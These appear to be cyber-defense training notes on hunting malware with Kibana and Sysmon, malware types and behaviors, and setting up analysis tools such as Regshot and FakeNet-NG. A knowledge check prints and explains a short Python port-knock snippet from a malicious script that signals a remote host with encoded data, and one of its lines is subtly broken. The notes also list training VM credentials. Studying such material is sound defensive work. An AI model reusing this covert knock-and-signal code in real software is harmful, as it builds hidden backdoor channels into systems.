Both of these methods can be difficult to catch via host logs because many logging solutions do not capture the level of detail needed to identify the behavior. Some services may log that some odd behavior, such as a malformed session, occurred. Normally, these activities must be detected through behavioral analysis at both the network and host levels. A Host-Based Intrusion Detection System (HIDS), such as SolarWinds or Tripwire®, could alert on this type of behavior. More frequently, however, this behavior is alerted on by a network-level Intrusion Detection System (IDS), and then individual host logs can be used to correlate events between hosts.

--------------------

Analyze Malware Network Persistence
Through the use of Winlogbeat installed on the Windows host, Kibana can aggregate Windows Event Logs to aid in discovering malware. Complete the steps in the following workflow to aggregate such logs.

﻿

NOTE: The VM win-hunt, Security Onion, and Elastic Stack should be open from the prior workflow. If they are not, use the following credentials to open them:

﻿

win-hunt﻿

Username: trainee
Password: CyberTraining1!
﻿

Security Onion and Elastic﻿

Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

Workflow
﻿

1.  Set the date range for Kibana from September 16, 2022 @ 09:00 to September 16, 2022 @ 13:00.

﻿

2. Show event logs related to the Microsoft firewall by using the following search filter:

event.code:"2004" or event.code:"2006"

﻿

Event code 2004 is related to the creation of a new firewall rule, and event 2006 is related to the deletion of a firewall rule.

﻿

The message field contains information related to the firewall rule. Included in the information are the rule name, rule direction, and protocol. The port number is included not here but, instead, in the winlog.event_data.LocalPorts field.

﻿

Keep all VMs and tools open, and answer the following questions.
<img width="1077" height="535" alt="image" src="https://github.com/user-attachments/assets/fa47ba9d-786e-4b22-8c8e-21b8df8b7f75" />

Knowledge Check
The following is a snippet from the malicious script that displays a function:

﻿

d﻿ef pop(a,i):
 ﻿   ran = [65535//i, 32768+i, 1337*i]
 ﻿   stat = []
 ﻿   for r in ran:
 ﻿       ps = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 ﻿       ps.setdefaulttimeout(1)

 ﻿       s = ps.connect_ex((a,r))
 ﻿       if s == 0:
 ﻿           stat.append("OK")
 ﻿       ps.close()
 ﻿   if(len(stat) == 3):
 ﻿       ps = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 ﻿       connect((a,int(base64.b64decode(b'NDg5NDQ=').decode())))
 ﻿       ps.sendall(base64.b64decode(b'MHhGRUVEQkVFRg=='))
 ﻿       ps.close()

 ﻿   if(ps):
 ﻿       ps.close()

<img width="1004" height="659" alt="image" src="https://github.com/user-attachments/assets/ced04d5b-2392-4388-bc7d-bd2fedc522ca" />


--------------

Knowledge Check Solution
The purpose of the provided code snippet is to issue a port knock trigger and, upon sending three successful port knocks, some Base64-encoded data is transferred to the remote host. The obfuscated nature of the function makes determining its functionality slightly difficult; however, the function can be broken down into four main components, as follows.

﻿

Port Knock Part 1
     ran = [65535//i, 32768+i, 1337*i]
﻿

The above code creates an array of three numbers, which act as ports.

﻿

The i  variable is passed as an argument to the pop() function to modify which ports are contacted.

﻿

Port Knock Part 2
   for r in ran:
       ps = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       ps.setdefaulttimeout(1)
       s = ps.connect_ex((a,r))
﻿

The above code iterates over the ports in the ran array and connects to the host passed to the pop() function, which is stored in the a variable.

﻿

Port Knock Part 3
        if s == 0:
              stat.append("OK")
        ps.close()
﻿

A zero indicates that the connect_ex function returned without error, meaning that a successful connection was made. The status of OK is added to the stat array to indicate that the port was successfully knocked.

﻿

Port Knock Part 4
     if(len(stat) == 3):
          ps = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          connect((a,int(base64.b64decode(b'NDg5NDQ=').decode())))
          ps.sendall(base64.b64decode(b'MHhGRUVEQkVFRg=='))
          ps.close()
﻿

If each port has been successfully knocked, the length of the stat array is three (one entry for each port), and a new connection will be established to the host passing Base64-encoded data.﻿

-----------

Propagation of Network-Based Malware
Thus far, the lesson has focused on identifying malware already present in the network. However, it is arguably more important to identify when and how the malware ended up there or, ideally, identify its presence as it is happening and potentially prevent it. This section focuses on techniques malware commonly uses to move laterally and propagate throughout a network.

﻿

Phishing
﻿

The main source of malware is phishing, a method of malware propagation that takes advantage of individuals’ willingness to trust the validity of an email or email attachment. For example, a threat actor creates a phishing email campaign targeting users who tend to purchase blue tennis shoes. The email is created to entice the targeted users to open a malicious link promising a surprising discount on the newest blue tennis shoe. Instead of taking the user to a storefront, the email link sends a request to the threat actor’s C2 platform and executes a browser exploitation framework against the user’s web browser, potentially resulting in a compromised machine.

﻿

Code Obfuscation
﻿

Although signatures can be written for common malware heuristics, threat actors can obfuscate their code by modifying the code’s structure. Examples include the use of command shortcuts, such as the PowerShell function ExecutionPolicy (shortcut -ep), or modifying the code via exclusive or (XOR) or Base64 encoding. Malicious code that is obfuscated through these methods easily bypasses simple signature-based firewalls and can even pass through heuristic-based scanners.

﻿

Fast Flux DNS Network
﻿

If an attacker’s C2 IP address is compromised, the entire campaign risks being shut down. One technique the attacker can use to provide redundancy is setting up a fast flux DNS network for DNS request modification. In this technique, the attacker provides multiple IP-to-domain-name mappings for their C2 platform. As soon as one IP is compromised, the C2 is switched to another. There are three types of fast flux networks: Dynamic DNS (DDNS), single flux, and double flux networks.

﻿

Windows Management Instrumentation (WMI) and Server Message Block (SMB)
﻿

WMI and SMB protocols can also be leveraged to propagate malware through a network. With WMI, attackers can gain remote command execution capabilities on Windows systems, enabling them to take control of network resources. Malware can utilize SMB to exploit vulnerabilities in the file-sharing protocol in order to gain further access across a network. These tactics are more difficult to protect against, as they are commonly used by system administrators to manage users and computers within a domain.

<img width="1112" height="552" alt="image" src="https://github.com/user-attachments/assets/3c8a91af-d806-4122-8c2e-127d71dbda69" />


﻿---------

 
### CDAH-M23L1-Malware Characteristics and Behavior ###

Malicious or Benign Program Behavior
The term "malware" is shorthand for malicious software programs or code. Malware is considered malicious because its purpose is to harm the systems and networks it invades, damages, disables, or overtakes. Attackers use malware for a variety of reasons, such as making money off of a business or sabotaging data for a person or company. Before analysts can recognize malware, they must first be able to recognize what constitutes normal behavior on a system in comparison to what is malicious. 

﻿

Suspicious Behavior in Benign Programs
﻿

Benign, or harmless, computer programs and malware share one critical trait in that they are both designed for specific Operating Systems (OS). Because of this trait, they may also display similar behavior patterns with each other, when interacting with a computer's OS. Computer programs interact with specific OSs through system calls to the OS's Application Programming Interface (API). These system calls allow the program to access different parts of the OS such as file management or network access. It is common for benign computer programs to make specific types of system calls that may seem malicious, despite being completely normal for how the program should perform or be used. 

﻿

﻿

Benign Suspicious Activity
﻿

In 2011, a faulty Microsoft update caused Microsoft to identify Google Chrome as a trojan and removed it. This is an example of how benign software occasionally performs suspicious actions that trick antivirus programs into flagging malware on a system. In this case, Chrome behaved in a way that seemed suspicious to Microsoft, although it was not doing anything malicious. This is known as a false-positive.

﻿

Suspicious Usage
﻿

Security-related events may result from the normal program and OS usage, even if there is no malware on the system. For example, a user may forget their password and attempt to log in multiple times, causing a false-positive security alert. Another example is a slow computer that results from hardware issues. While this should still be investigated, it does not necessarily indicate that malware exists on the system.

﻿

Even though some suspicious activities in benign programs are considered common, analysts should still investigate each individual situation with the assumption that malware may be present on the system. This is especially important since malware and benign programs may initially display similar behavior.

﻿

Suspicious Behavior in Malware
﻿

A system that displays just one instance of suspicious behavior, at any given time, does not necessarily indicate that malware is present. However, if a system presents multiple suspicious behaviors, this increases the likelihood that some form of malware is on the computer. The following is a list of common suspicious behaviors that analysts should investigate further, especially when multiple different behaviors appear together: 

Unexpected Crashes: The system crashes or the Blue Screen of Death (BSOD) regularly occurs. 


Slow System: A system is running slowly and there are not any resource-heavy applications running.

Excessive Hard Drive Activity: An unusual amount of hard-drive activity occurs when the computer is idle.

Strange Windows: Unusual pop-ups during the boot sequence, such as lost access to a drive on the system.

Unusual Pop-up Messages: Dialogue boxes alerting the user that various programs or files will not run or open while the system is running.

Unusual Program Activity: Programs on a system that are missing or corrupted, start without being prompted, or attempt to access the internet without user consent.

Random Network Activity: High amount of network activity detected on a system where the user is not running any resource-heavy programs or downloading large files.

Unusual Email Activity: Emails users attempt to send are neither sent nor received, while emails users did not send are being sent on their behalf.

Unexpected Antivirus Disabling: Antivirus systems are suddenly disabled. Most malware is designed to disable a host system's antivirus software upon deployment of the malware on a system.

Lack of Storage: Unfamiliar files or programs on the computer take up large amounts of space.
﻿

<img width="1105" height="644" alt="image" src="https://github.com/user-attachments/assets/3c6eff83-0ae2-45ff-a3ef-22b617f5f5e6" />


----------------

Using System Events to Find Malware
Specific Sysmon and Windows events can be useful to watch for, when hunting for malware on a Windows system. Analysts should focus on events such as creation, deletion, installation, and permission change logs, since these may indicate unusual malware behavior. Table 23.1-1, below, provides a list of Windows Event IDs for these types of activities. All the events are located in the Windows Security Log, except for event 7034, which is located in the Windows System Log. 

﻿<img width="1667" height="714" alt="image" src="https://github.com/user-attachments/assets/775e5a97-71d0-4c14-9f6a-41adaf67cd6a" />


﻿Table 23.1-2, below, provides a list of Sysmon Event IDs that are also useful for hunting malware:

<img width="1668" height="839" alt="image" src="https://github.com/user-attachments/assets/507ec629-0a0f-46a5-8cf7-537e6658a012" />


Analysts should also pay attention to the spelling of system services when hunting for malware, since attackers may misspell common services such as chrome.exe to chrom.exe to avoid detection.


Identify Indicators of Malicious Activity


A remote attacker gained access to a machine. Discover, at a high level, the malicious actions that the attacker performed on the system.


Workflow


1. Log in to the Virtual Machine (VM) win-hunt using the following credentials: 
Username: trainee
Password: CyberTraining1!



2. Open Chrome, then select the bookmark Discover - Elastic.


This displays a warning on the page that states, "Your connection is not private."


3. Select Advanced, then select proceed to 199.63.64.92 (unsafe). 


4. Login to Elastic with the following credentials
Username: trainee@jdmss.lan
Password: CyberTraining1!



5. Set the Kibana filter dates from Jul 27, 2022 @ 09:27:00.000 to Jul 27, 2022 @ 09:36:00.000, as displayed in Figure 23.1-1, below:


<img width="542" height="66" alt="image" src="https://github.com/user-attachments/assets/2d33b98e-b89a-44cf-8600-b982ee78201d" />


6. In the search field, filter the logs to focus on a single host by entering the following and pressing enter to execute the query:
agent.name:bp-wkstn-1



The log data may still be difficult to read, but filtering with additional display fields makes it easier to view.


7. In the section Add filter, in the filter search box highlighted in red in Figure 23.1-2, below, search for event.code, then select the blue plus sign to add the specified field as a column.

<img width="288" height="230" alt="image" src="https://github.com/user-attachments/assets/24ed2a56-56ef-4553-961d-83936ceb4434" />




8. Repeat the previous step to add the following two fields:
event.provider
message
9. Discover recently executed programs by adding the following in the search field: 
agent.name:bp-wkstn-1 and event.code:1



10. Discover network connections and identify the programs that were executed and are associated with network activity by entering the following in the search field:
agent.name:bp-wkstn-1 and event.code:3



11. Discover files recently created by entering the following in the search field:
agent.name:bp-wkstn-1 and event.code:11



Use the information from this lab to answer the next question.


<img width="1110" height="591" alt="image" src="https://github.com/user-attachments/assets/e2762161-a78e-437d-95a8-29a43c9907db" />

<img width="1667" height="714" alt="image" src="https://github.com/user-attachments/assets/f93621a2-5c9e-4895-84da-6033abd696e8" />
<img width="1668" height="839" alt="image" src="https://github.com/user-attachments/assets/288275d4-72f8-4990-a9e7-c9eb941f0ff8" />


-------------

Malware Behavior
There are different ways to categorize malware to help defense analysts recognize, hunt, and resolve issues from malware attacks. The most common method for classifying malware is by its behaviors and characteristics, however, that is not the only way by which malware can be analyzed. The following describes common approaches to understanding malware for defense analysts:

Behaviors and characteristics: The way the malware replicates or spreads and its other distinguishing attributes.

Malware goal or objective: The purpose of the malware. The goal of ransomware is financial, whereas spyware aims to capture sensitive information.

Delivery method or attack methodology: The way the malware reaches its target. For example, phishing emails with malicious links that automatically download malware.

Target platform or device: Malware designs must change based on whether they're attacking mobile devices or specific operating systems.

Type of exploited vulnerability: The specific vulnerability the malware exploits. For example, an SQL injection gains access to or modifies data. Another example is domain spoofing, where attackers seduce web visitors to click on links to malicious websites that are portrayed as legitimate sites.

Approach to stealth and evasion: Rootkits typically replace legitimate operating system components.

The next section introduces the following topics to help identify malware, further:

Types of Malware

Key Behaviors

Commonly-Exploited Vulnerabilities

Types of Malware
﻿

There are different types of malware that each have specific behaviors and characteristics that make them unique. For example, malware may differentiate in the way it spreads or replicates itself. The following are some of the most common types of malware, followed by an overview of each to highlight key traits and differences:

Adware

Spyware

Computer Virus

Worm

Trojan

Rootkit

Phishing and Spear Phishing

Bots and Botnets

Ransomware

﻿

Adware
﻿

Adware is a program that displays advertisements on a computer, redirects user search results to different advertising websites, and then collects marketing data about the user. Adware typically collects data about the type of websites visited to allow advertisers to display custom advertisements.

﻿

Another form of malicious adware is intrusive pop-up advertisements for computer fixes for a virus that is not actually present on the computer.

﻿

Spyware
﻿

Spyware is software that spies on a user. The goal of spyware is to monitor and capture web browsing and other activities, and, like adware, spyware often sends data about browsing activities to advertisers. Spyware can capture sensitive information such as banking accounts, passwords, and confidential business information. An example of spyware is keylogger software that records whatever the victim types using the keyboard.

﻿

Virus
﻿

The primary characteristic of a computer virus is replicating its malicious traits on the system through user interaction. Viruses may take the form of executable files that are triggered by user actions such as running the file or they may appear as macros embedded into Microsoft Office applications. 

﻿

Viruses attack and infect existing files on the target system and often target system files that the system executes. This type of malware can steal and corrupt data and consume system resources to render a system ineffective or altogether unusable. Viruses can also be covert and hard to detect. They often arrive unknown, hide on a system, and then replicate on that system without being detected. 

﻿

Worm
﻿

Similar to a virus, worms are designed to replicate themselves. However, worms can be designed to replicate with specific targeting, infecting specific files that are already on a computer. Worms carry themselves in their own containers and accomplish their activities inside of the application that moves them. Worms can also interact with the hosts while the malicious self-propagating executable, task, or similar keeps moving around. Worms spread through a network and rely on security failures to access a system and either steal or delete data.

﻿

Trojan
﻿

A trojan is a malicious program that misrepresents itself to appear useful. Attackers deliver trojans as routine software that persuades victims to install the trojans on their computers. Trojans can also be embedded in computer applications or software. A trojan's payload can be anything, but it is most often used as a backdoor into a system that allows attackers access to the affected computer. 

﻿

Trojans can give attackers access to any of the personal information of the computer such as IP addresses, passwords, or any sensitive information stored on the computer. Trojans can also be used to install other forms of malware such as Spyware in the form of a keylogger.

﻿

Rootkit
﻿

A rootkit is a type of malware program that enables attackers to gain access to and infiltrate data from machines. Attackers use rootkits to target specific machines and eavesdrop on victims.

﻿

Rootkits have a low chance of being detected, which makes them one of the most difficult forms of malware to discover and remove. Rootkits provide attackers access to the system by hiding in different levels of a computer. Some rootkits hide within user levels of a system, while others hide within the kernel of a system. Once a rootkit is installed, the attacker can remotely execute files and change system configurations on a host machine. If a rootkit is detected on a system, a best practice defensive measure is to completely wipe the storage drive (if possible) and reinstall the OS from scratch.

﻿

Bots and Botnets
﻿

Bots are malicious programs that infiltrate a computer, then respond to and carry out instructions from an attacker. Bots may self-replicate, similar to viruses. An entire network of bots is known as a botnet. One of the most common uses of a botnet is to launch a Distributed Denial of Service (DDOS) attack that makes a machine or an entire domain unavailable.

﻿

Ransomware
﻿

Ransomware is a type of malware that uses encryption to lock the data on a victim's computer or an entire network. The attackers then demand ransom payments before decrypting the data and returning it to the victim. Unlike other attacks, the victim is notified of the exploit and provided instructions for making payments to have the data restored. However, paying the ransom does not guarantee that victims will be able to access their data again. Attackers have also threatened to leak sensitive company secrets online if victims refuse to pay the ransom.

﻿

Phishing and Spear Phishing
﻿

Although phishing is not technically a type of malware, it is the most common method that attackers use to distribute actual malware. Phishing occurs when an attacker lures one or more victims into providing sensitive data by sending them emails, telephone calls, or text messages while posing as a legitimate business or person. Spear phishing refers to an attack that targets a specific individual, such as the CEO or CFO, to gain access to sensitive financial data.

﻿

A phishing attack often begins with an attacker posing as someone that the victim is familiar with or trusts. Then, the attacker tricks the victim into opening either malware-infected Uniform Resource Locators (URL) or attachments included in an email. Malware-infected URLs fool the victim into thinking they are visiting their bank or another online service. The malicious site then captures sensitive data from the victim. Malware-infected emails contain attachments that the victim downloads, which leads to malware on the system.

﻿

Key Behaviors
﻿

The most common way to classify malware, as listed above, is by its distinguishing or "key" behaviors. The following are common behavior categories under which different types of malware may fall:

Downloaders and Backdoors

Credential Stealers

Process Injections

DLL and Direct Injections

Hook Injections

Persistence Methods

DLL Load Order Hijacking

﻿

Downloaders and Backdoors
﻿

In a malware attack, an attacker often uses a range of trojans to infiltrate a vulnerable system. These types of malware then create a downloader or backdoor that allows the attacker to gain remote access to the targeted system. 
﻿

﻿

Credential Stealers
﻿

Credential stealers search for passwords saved on a target machine, then transfer them remotely to an attacker using command and control channels or email. Credential-stealing malware usually waits for users to log in. Other malware uses keylogger methods to log keystrokes or tools that dump credentials stored in Windows, such as password hashes, to crack the logins offline.

﻿

Process Injections
﻿

Process injections give attackers the ability to insert and run malicious code in the address space of a legitimate application. Running code in the environment of another application may grant access to the application's process memory, network or system resources, and even elevated privileges. The malicious code is typically inserted into common system processes such as svchost.exe or regsvr32.exe. This can grant the attacker a level of stealth.

﻿

DLL and Direct Injections
﻿

Dynamic-Link Library (DLL) injection is a type of process injection where the attacker writes the path to a malicious DLL inside of an application's process. Then, using a remote thread, the attacker executes the application causing the malicious DLL to run. A direct injection involves the direct placement of malicious code into another process.

﻿

Hook Injections
﻿

Hook injections load and run malicious code within the environment of another program. This mimics the original execution while also gaining access to memory processes. This technique can also be used to intercept API calls.

﻿

Persistence Methods
﻿

After malware infects the processes of a system, the attacker's goal is usually for the malware to be present for a long period of time. Attackers can establish a persistent presence on their target systems in different ways, such as the following:

Modify the registry keys to collect details about the system and then save configuration information.

Using OS-specific task scheduling tools to schedule tasks at a specific time, such as regularly executing malware after the system restarts.

Create or modify services, such as OS boot ups, to repeatedly execute malicious payloads and malicious programs in the background, as part of usual service performance.

If attackers successfully schedule tasks or modify OS services, this allows the malware on an infected machine to continue to function, even after the victim logs off, reboots, or restarts the infected system.

﻿

DLL Load Order Hijacking
﻿

Windows systems typically search in a specific order for the DLLs required by an executable. When the executable is not searching for the DLL through specified paths, an attacker can place malicious code in the DLL search order so that the malicious code is then loaded by the executable.

﻿

Commonly-Exploited Vulnerabilities 
﻿

While no system is safe from malware, there are some common vulnerabilities that attackers seek out to exploit a system. These vulnerabilities are within the control of an organization, so organizations can and should proactively address and manage the following common vulnerabilities:

Misconfigurations

Exposed External Websites or APIs

Outdated or Unpatched Software

Zero-Day Vulnerabilities

Weak or Stolen User Credentials

﻿

Misconfigurations
﻿

Misconfigurations are one of the largest threats to network and application security. Most cyber security tools require manual configuration and updating, however these tasks are error-prone and take considerable time to manage.

﻿

If a business hosts a Domain Name Server (DNS) server, attackers may start their attacks by performing a DNS scan on any externally hosted DNS servers. Attackers will search an organization for Internet Protocol (IP) subnets to discover any weak Virtual Private Networks (VPN), misconfigured IP addresses, or unprotected servers.

﻿

Exposed External Websites or APIs
﻿

Attackers may search a company's external-facing websites for security gaps, as well as any web application firewalls or lack thereof. Attackers also check for unsecured application programming interfaces (APIs). APIs provide a digital interface that enables applications to communicate with each other over the internet or VPN. APIs usually have a public IP address, which, if unsecured, attackers use as a target to breach. 

﻿

Similar to misconfigurations, securing APIs requires manual configuration, which can be prone to human error. Employees may be unaware of the security risk that APIs possess and only rely on standard security measures, which may provide attackers the breach opportunities they are searching for.

﻿

Outdated or Unpatched Software
﻿

Software vendors periodically release new updates to add new features or patch known vulnerabilities. Unpatched or outdated software is an easy target for cybercriminals to target victims. Organizations are responsible for keeping their systems up to date. However, some software vendors release updates daily, which can overwhelm some IT teams. If the teams fall behind on important security updates or patches, this provides an opportunity for an attacker. It may take just one system to be out of date for an attacker to be successful in exploitation.

﻿

Zero-Day Vulnerabilities
﻿

A zero-day vulnerability refers to a security flaw that a threat actor discovers before the enterprise or software vendor. The term "zero-day" refers to the fact that software vendors have "zero" days available to work on a security patch if a threat actor discovers the vulnerability first. These vulnerabilities simply cannot be resolved until the patch is rapidly prepared, putting software users and vendors at risk in the meantime. Zero-day attacks are extremely dangerous for organizations because they are very difficult to detect until an attacker makes the vulnerability known.

﻿

Weak or Stolen User Credentials
﻿

Many users create weak passwords for their accounts, since they are easy to remember. It is common for users to create passwords based on information relevant to them, or recycle and reuse passwords between accounts. Attackers can exploit weak credentials through brute force attacks to gain access to a target system. Phishing techniques are also effective for convincing users to divulge their passwords in websites that appear legitimate, but are actually just spoofed websites that trick users into submitting their passwords.

<img width="1144" height="584" alt="image" src="https://github.com/user-attachments/assets/c77abab8-7123-4aa8-b09c-1ccadc092cc4" />
<img width="1131" height="706" alt="image" src="https://github.com/user-attachments/assets/2d2be01b-56cf-4445-aa0e-a5432b34cf1c" />

-----------------

Identify Malware Characteristics
A local user is reading their company email and clicks on a link which in turn downloads malware to their system. Immediately after selecting the link in one email message, the entire screen becomes black and displays the information in Figure 23.1-3, below:


<img width="950" height="462" alt="image" src="https://github.com/user-attachments/assets/8acf7246-5e7b-4e37-8447-4071bf71343c" />


Investigate this situation and identify the actions that led the system to being compromised.


Workflow


1. Log in to the VM win-hunt using the following credentials: 
Username: trainee
Password: CyberTraining1!



2. Open Chrome and select the bookmark Discover - Elastic.


This displays a warning on the page that states, "Your connection is not private."


3. Select Advanced, then select proceed to 199.63.64.92 (unsafe). 


4. Login to Elastic with the following credentials
Username: trainee@jdmss.lan
Password: CyberTraining1!



5. Set the Kibana filter dates from Jul 27, 2022 @ 15:10:27.000 to Jul 27, 2022 @ 15:12:00.000, as displayed in Figure 23.1-4, below:


6. In the search field at the top of the dashboard, filter the logs to focus on a single host by entering the following and pressing enter to execute the query:
agent.name:"bp-wkstn-1"



7. In the section Add filter, search for each of the following fields and select the blue plus sign to add each as a column in the output table:
event.code
event.provider
message
8. Search for recently executed programs to find the delivery method of the malware by filtering the logs with the following search query:
agent.name:"bp-wkstn-1" and event.code:"7"



The results of the search indicate that Outlook ran, then Microsoft Edge ran shortly afterwards. 


9. Identify and locate the downloaded file and its contents by entering the following query. 
agent.name:"bp-wkstn-1" and event.code:"15"



To assist with locating the file that was downloaded from Edge, focus on the field winlog.event_data.Contents. Figure 23.1-5, below, displays the field RuleName, which identifies the attack vector used with its corresponding MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) Identifier (ID).


<img width="600" height="87" alt="image" src="https://github.com/user-attachments/assets/05f33a8a-8d71-418b-a33a-61765c3b7bdc" />



10. Identify whether the file was read or executed by entering the following query:
agent.name:"bp-wkstn-1" and event.code:"1" and "TrainingRoster.csv.bat"



Figure 23.1-6, below, displays the file that was executed by cmd.exe:

<img width="666" height="106" alt="image" src="https://github.com/user-attachments/assets/b028fc6a-581b-4a32-888f-6863256a391b" />


Use the information from this lab to answer the next question.
<img width="1121" height="701" alt="image" src="https://github.com/user-attachments/assets/c8b4056a-c69b-4397-bb4f-e67b3613205e" />


----------------------

### CDAH-M23L2-Creating a Malware Analysis Lab ###

Malware Analysis Overview
Malware analysis is the process of understanding the behavior and purpose of a suspicious file, Uniform Resource Locator (URL), or program to detect potential threats. Malware analysis is one of the first steps taken to identify malware before it can infect a system and cause harm to critical organizational assets. The analysis attempts to identify vulnerabilities before they can be exploited. 

﻿

Malware analysis allows organizations to triage incidents by threat level and uncover any IOCs. It provides a more comprehensive threat-hunting image and improves IOC alerts and notifications.

﻿

Types of Malware Analysis
﻿

Malware analysis can be conducted in multiple ways: static analysis, dynamic analysis, or a hybrid of both.

﻿

Static Malware Analysis
﻿

Static malware analysis is the process of analyzing a malware sample without actually running its code; instead, the file is examined for signs of malicious intent. Technical indicators, such as file names, hashes, Internet Protocol (IP) addresses, domains, and file header data, can be identified and evaluated. Other malware analysis tools, such as a disassembler or network analyzers, can be used to observe the malware without running it, to collect information about how the malware works in its current state. 

﻿

Because static malware analysis does not run the code, some malicious runtime behaviors from sophisticated malware may be undetected. For example, if a file generates a dynamic string that downloads a malicious file based on the string, static analysis may not detect the malicious file. In such situations, dynamic analysis is useful for a more complete understanding of file behaviors. 

﻿

Dynamic Malware Analysis
﻿

Dynamic malware analysis executes the suspected malicious code in a safe environment or sandbox. A sandbox is an isolated machine that is usually a Virtual Machine (VM). The machine is closed off from the network, allowing threat hunters to view the malware in action without the risk of infection of the system or network. 

﻿

Dynamic malware analysis provides deeper visibility into the file, allowing security teams to uncover the true nature of the threat. Some malware analysis tools allow for automatic sandboxing of files, saving security teams the time of reverse-engineering a file to discover the malicious code.

﻿

The challenge with dynamic analysis, similar to static analysis, is that advanced attackers are familiar with sandbox use and may design code to deceive a sandbox. Adversaries can hide code inside a file until certain conditions are met, at which time the malicious code is released and run. 

﻿

Hybrid Malware Analysis
﻿

Hybrid malware analysis is a combination of static and dynamic malware analysis. Because neither static nor dynamic analysis is reliable for detecting sophisticated malware, a combination of the two techniques provides analysts with the best of both approaches. Hybrid analysis can detect malicious code that is trying to hide and then extract other IOCs because the static analysis can be performed before and after malware is run. Hybrid analysis can help to detect unknown threats — even the most sophisticated forms of malware. 

﻿

As an example, with hybrid analysis it is possible to apply static analysis to data that is generated by behavioral analysis, as when a piece of malicious code runs and generates some change in system memory. The dynamic analysis would detect the change, and analysts would be alerted to perform basic static analysis on the memory dump. As a result, analysts can view the malicious code differently and generate more IOCs from it.

﻿

Host and Network Analysis Tools
﻿

Multiple host analysis tools are available that can be used to evaluate malware behavior. Each tool can be used for a specific purpose and tuned to look for specific malware behaviors if intelligence suggests that specific malware may be targeting an organization.

﻿

Process Monitor
﻿

Process Monitor (Procmon), part of the Windows Sysinternals tool suite, records live file system activity, such as process creations and registry changes. Procmon has prebuilt filters that analysts can use to quickly identify what processes were created, where the executable was run from, and the parent/child dependencies. 

﻿

Procmon can be useful for malware analysis when analyzing potentially malicious documents. For example, attackers may use malicious Microsoft Word documents as an attack vector. The documents can contain malicious macros that call out to the attacker’s infrastructure and download a payload. Using Procmon, analysts can detect the Word document being opened and view the hidden PowerShell process being launched and any other commands being run.

﻿

System Monitor
﻿

System Monitor (Sysmon), also part of the Windows Sysinternals tool suite, is a proactive monitoring tool that can monitor such events as process creation, process termination, network connections, file creation timestamp changes, raw disk access, and process memory access. Sysmon performs system activity deep monitoring and logs high-confidence indicators of advanced attacks. Sysmon log entries contain such information as the Process Identifier (PID) of the parents, the parent’s process name, and the command line. 

﻿

Sysmon is most often used in conjunction with a Security Information and Event Management (SIEM) solution to help analyze the event information and make it more amenable to analysts.

﻿

Autoruns    
﻿

Autoruns, another Windows Sysinternals tool, can display any installed software on a device that is set to launch when a machine is powered on. Malware can hide but eventually must run, and, to survive a reboot, it must create a persistence mechanism. To do this, attackers use such techniques as creating a scheduled task or creating specific run keys in the registry. 

﻿

After a piece of malware runs in a sandbox, Autoruns can be used to analyze and detect any new persistence software and the technique that the malware is using to survive on a system. This can be useful to analysts to search for any such indicators on a system that may have been infected with malware.    

﻿

TCPView
﻿

TCPView, also a Windows Sysinternals tool, can show detailed listings of all Transmission Control Protocol (TCP) and User Datagram Protocol (UDP) endpoints on a system, including local and remote addresses and the state of any TCP connections. When TCPView starts, it enumerates all active TCP and UDP endpoints resolving all IP addresses to their domain name versions. TCPView shows the name of the process that owns each endpoint, including a service name.  

﻿

TCPView is best used in conjunction with other tools, such as Procmon, to view how malware interacts with processes and the network. In a sandbox environment, TCPView can show analysts which IPs the malware calls out to and give threat hunters a vital piece of information with which to begin a hunt. 

﻿

Regshot
﻿

Regshot is a tool that can take registry snapshots and compare the registry before and after system changes are made. In a sandbox environment, analysts can thus compare a registry before and after running malware. The tool analyzes and highlights any differences found.  

﻿

FakeNet-NG
﻿

FakeNet-NG is a network simulation tool that allows for the dynamic analysis of malware. The tool simulates a network so that the malware interacts with a remote host and continues to run, allowing an analyst to observe the malware network activity within a sandbox environment. 

﻿

By default, FakeNet-NG is configured to start several common services, such as Domain Name System (DNS), Hypertext Transfer Protocol (HTTP), Hypertext Transfer Protocol Secure (HTTPS), Simple Mail Transfer Protocol (SMTP), and a binary listener on port 1337. Once the malware is run, analysts can observe its behavior and view any malware communications with an attacker’s Command-and-Control (C2) server. FakeNet-NG is also capable of performing analysis of running executables on a system. FakeNet-NG can detect the exact executable name that is generating captured traffic, such as malicious DNS traffic.

 

After an analyst observes the malware, they can begin a threat hunt with the gained information, such as IP addresses that attackers are using for communication or the name of an executable that is generating malicious traffic. These are examples of the vital information that can be gained using malware analysis tools for threat hunting. 

<img width="1118" height="584" alt="image" src="https://github.com/user-attachments/assets/3e296542-a00d-4f73-af79-037fda9221c9" />

-------------

Analyze Malware
In the following lab series, dynamically analyze a malicious file on the desktop (Lab1.exe) by using various tools to identify its characteristics. Look for what files it writes to disk, any persistence capabilities, and which IPs or ports it uses for communication.

﻿

Complete the tasks in the following workflow to analyze a malicious file using Regshot.

﻿

Workflow
﻿

1. Log in to the VM win-hunt using the following credentials: 

Username: trainee
Password: CyberTraining1!
﻿

2. On the desktop, select Regshot-x64-ANSI. Regshot is a tool that performs a comparison of the registry before and after the malware is run to detect any changes.

﻿

3. Select Yes when a prompt appears requesting permission for Regshot-x64-ANSI to be executed as administrator.

﻿

4. Once the program loads, select 1st shot, and select Shot to capture the current state of the registry, before the malware is executed:


<img width="395" height="156" alt="image" src="https://github.com/user-attachments/assets/dd4fbc6d-5dd7-4482-b862-2f5b92cb920f" />


5. Upon completion of the capture, minimize the Regshot window.


NOTE: The 2nd shot button is available for selection upon capture completion, but it should not be selected yet.


6. Return to the desktop, and open Lab1.exe, the malware file. When a message appears requesting permission to make changes to the device, select Yes.


NOTE: Avoid running any other file or program before opening the malware file. Regshot records everything, and additional activity results in many more lines of data to filter.


7. After approximately 10 seconds, return to the Regshot window, and select 2nd shot.


8. After the second Regshot capture is complete, select Compare to see the results. The number of values returned with each comparison of the first and second shots varies each time Regshot is used. Many lines are in the output, and seeing changes can be challenging. However, a close look shows that only a few entries refer to new entries containing paths to .exe files:


<img width="1565" height="454" alt="image" src="https://github.com/user-attachments/assets/210d3026-cda7-4295-9ab6-dc81e8b5cf50" />

9. Close the Regshot results, and close Regshot. 


10. Right-click the cleanup.bat file on the desktop, and select Run as Administrator. This file stops the malware from running and removes all artifacts it adds to the system. 


